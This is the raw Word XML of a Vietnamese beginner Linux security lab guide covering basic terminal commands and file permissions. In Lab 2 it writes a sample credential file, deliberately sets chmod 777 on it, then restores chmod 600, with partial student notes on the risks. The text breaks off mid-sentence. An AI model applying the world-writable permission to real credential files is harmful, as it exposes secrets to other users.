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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Linux + Security LAB - Hư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>ng D</w:t>
      </w:r>
      <w:r>
        <w:t>ẫ</w:t>
      </w:r>
      <w:r>
        <w:t>n Chi Ti</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Tài li</w:t>
      </w:r>
      <w:r>
        <w:t>ệ</w:t>
      </w:r>
      <w:r>
        <w:t>u này hư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>ng d</w:t>
      </w:r>
      <w:r>
        <w:t>ẫ</w:t>
      </w:r>
      <w:r>
        <w:t>n t</w:t>
      </w:r>
      <w:r>
        <w:t>ừ</w:t>
      </w:r>
      <w:r>
        <w:t>ng bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c th</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>c hành LAB Linux + Security cho ngư</w:t>
      </w:r>
      <w:r>
        <w:t>ờ</w:t>
      </w:r>
      <w:r>
        <w:t>i m</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>i. M</w:t>
      </w:r>
      <w:r>
        <w:t>ỗ</w:t>
      </w:r>
      <w:r>
        <w:t>i LAB g</w:t>
      </w:r>
      <w:r>
        <w:t>ồ</w:t>
      </w:r>
      <w:r>
        <w:t>m m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu, cách d</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>ng, command c</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n ch</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>y, 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 và ph</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n t</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> phân tích.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 1 - Làm Quen Terminal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Bi</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:t>dùng terminal Linux cơ b</w:t>
      </w:r>
      <w:r>
        <w:t>ả</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: M</w:t>
      </w:r>
      <w:r>
        <w:t>ở</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> terminal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Ctrl + Alt + T</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra thư m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c hi</w:t>
      </w:r>
      <w:r>
        <w:t>ệ</w:t>
      </w:r>
      <w:r>
        <w:t>n t</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>pwd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: Xem file/thư m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">ls </w:t>
      </w:r>
      <w:r w:rsidR="00A31589">
        <w:t>–</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00A31589" w:rsidRDefault="00A31589">
      <w:r w:rsidRPr="00A31589">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30AD5BC9" wp14:editId="0B59F3D1">
            <wp:extent cx="5486400" cy="3696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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: T</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>o thư m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>mkdir linux_lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 5: Đi vào thư m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>cd linux_lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 6: T</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>o file test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>touch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 7: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra l</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">ls </w:t>
      </w:r>
      <w:r w:rsidR="00A31589">
        <w:t>–</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00A31589" w:rsidRDefault="00A31589">
      <w:r w:rsidRPr="00A31589">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08042B34" wp14:editId="6DC18DC9">
            <wp:extent cx="4791744" cy="10860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33F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y thư m</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c linux_lab</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y file test.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u pwd và cd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006825B4" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">- Command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>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006825B4" w:rsidRDefault="006825B4"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ls –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lah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 w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- Output </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>chú</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> ý?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006825B4" w:rsidRDefault="006825B4">
      <w:r>
        <w:t xml:space="preserve">Output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.  </w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>Có</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ủ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>ro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ả</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>o</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00072C86"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umask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umask</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lỏng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lẻo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, file test.txt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shellcode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>…</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ế</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>u</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>là</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> h</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ệ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ố</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ng th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t thì c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ử</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>lý</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>gì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>thê</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>m</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00072C86" w:rsidRDefault="00072C86">
      <w:r>
        <w:t xml:space="preserve">+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</w:p>
    <w:p w:rsidR="00072C86" w:rsidRDefault="00072C86">
      <w:r>
        <w:t xml:space="preserve">+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tệp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>LAB 2 - Permission Security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u permission và risk chmod 777</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: T</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o file </w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:t>ứ</w:t>
      </w:r>
      <w:r>
        <w:t>a credential</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>echo 'admin:123456' &gt; creds.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra permission</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ls -l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: Set permission nguy hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>chmod 777 creds.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra l</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ls -l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 5: Fix permission</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>chmod 600 creds.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 6: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra l</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n cu</w:t>
      </w:r>
      <w:r>
        <w:t>ố</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ls -l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y permission thay đ</w:t>
      </w:r>
      <w:r>
        <w:t>ổ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u rwx</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u risk chmod 777</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">- Command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>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Chmod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ls –l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xác</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> minh </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xem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ý </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>chưa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- Output </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>chú</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> ý?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Chuỗi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 w:rsidR="00711FBD">
        <w:br/>
        <w:t>- Có r</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ủ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">i </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>ro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ả</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>o</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 777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proofErr w:type="gramStart"/>
      <w:r>
        <w:t>vì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cho</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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creds.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">+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:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+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</w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+ Leo thang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  <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ế</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>u</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
